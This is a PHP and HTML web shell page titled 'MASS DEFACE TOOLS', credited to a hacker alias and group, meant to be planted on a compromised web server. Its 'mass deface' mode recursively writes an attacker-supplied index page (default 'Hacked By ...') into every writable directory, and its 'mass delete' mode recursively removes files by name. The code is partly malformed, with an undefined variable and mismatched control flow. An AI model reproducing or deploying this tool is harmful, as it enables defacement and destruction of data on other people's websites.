<html>
<head>
<title>MASS DEFACE TOOLS</title>
<style>
body { 
    background: url('https://1.bp.blogspot.com/-YVIXpgGlQKw/XewVsnHtmuI/AAAAAAAAAQ4/BHZeXHkhyoM2M1SgK2teWAKbqCoW2cCLwCLcBGAsYHQ/s1600/22-38-42-6d9f0c36b9a4e8d1f73c93c9dd8602a3.jpg');
	background-repeat: no-repeat;
	background-position: center;
	background-size: 100% 100%;
    background-attachment: fixed;
	color: white;
}
input[type=text]{
	background: transparent; 
	color: aqua; 
	border: 1px solid aqua; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Iceberg';
	font-size: 15px;
}
input[type=submit]{
   background: transparent;
   color: white;
   border: 1px solid aqua;
   margin: 5px auto;
   padding-left: 5px;
   font-family: 'Iceberg';
   font-size: 15px;
}
textarea[name=script] {
	background: transparent;
	color: aqua; 
	border: 1px solid aqua; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Iceberg';
	font-size: 15px;
}
a,h1 {
	color: aqua;
	text-decoration: none;
}
a:hover {
	color: aqua;
}
#wible {
font-family: Courier;
color: white;
position: absolute;
left: 0;
right: 0;
top: 30%;
}
</style>
<div id='wible' align="center">
<div style="background:transparent;border:2px solid aqua;padding:24px;width:300px;"/>
<a href='?'><h1>MASS DEFACE TOOLS</h1></a><br />
<a href='?go=mass'>MASS DEFACE</a> |
<a href='?go=delet'>MASS DELETE</a>
</div></head><br />
<script>
var text="Created By Rizredvlo7zer0✬";
var delay=10;
var currentChar=1;
var destination="[none]";
function type()
{
//if (document.all)
{
var dest=document.getElementById(destination);
if (dest)// && dest.innerHTML)
{
dest.innerHTML=text.substr(0, currentChar)+"<blink>_</blink>";
currentChar++;
if (currentChar>text.length)
{
currentChar=1;
setTimeout("type()", 5000);
}
else
{
setTimeout("type()", delay);
}
}
}
}
function startTyping(textParam, delayParam, destinationParam)
{
text=textParam;
delay=delayParam;
currentChar=1;
destination=destinationParam;
type();
}
</script><b>
<div 0px="" 12px="" ComicSansMs="" color:="" FC0707="" font:="" id="textDestination" margin:="" style="background-color: none;color:aqua;"></div></b>
<script language="JavaScript">
javascript:startTyping(text, 50, "textDestination");
</script></center>
</html>
<?php
/**
Special thx to Indoxploit,
and my team garuda tersakti 72
---- ./GH05TW1BL3 ----
**/
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);	
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
elseif($_GET['go'] == 'mass'){
	function mass_kabeh($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=#18BC9C>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = mass_kabeh($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function mass_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=#18BC9C>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe'] == 'massal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			mass_kabeh($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe'] == 'biasa') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			mass_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
		echo "<a href='?'><- kembali</a>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe:</font><br>
	<div style='background:transparent;border:1px solid aqua;padding:5px;width:300px;'/>
	<input type='radio' name='tipe' value='biasa' checked>Biasa<input type='radio' name='tipe' value='massal'>Massal</div><br>
	<font style='text-decoration: underline;'>Dir:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 300px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 300px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 300px; height: 300px;'>Hacked By Rizredvlo7zer0✬ | GARUDA TERSAKTI 72</textarea><br>
	<input type='submit' name='start' value='Goo!' style='width: 300px;' class='btn btn-success btn-sm'>
	</form>";
		echo"<u><a href='https://api.whatsapp.com/send?phone=6285745620638&text=' target='_blank'>Say hello to me :)</a><u/></center>";
	}
}
elseif($_GET['go'] == 'delet') {
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=#18BC9C>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		hapus_massal($_POST['d_dir'], $_POST['d_file']);
		echo "</div>";
		echo "<a href='?'><- kembali</a>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Dir:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 300px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 300px;' height='10'><br>
	<input type='submit' name='start' value='Goo!' style='width: 300px;'>
	</form>";
		echo"<u><a href='https://api.whatsapp.com/send?phone=6285745620638&text=' target='_blank'>Say hello to me :)</a></u></center>";
}
}
}
?>
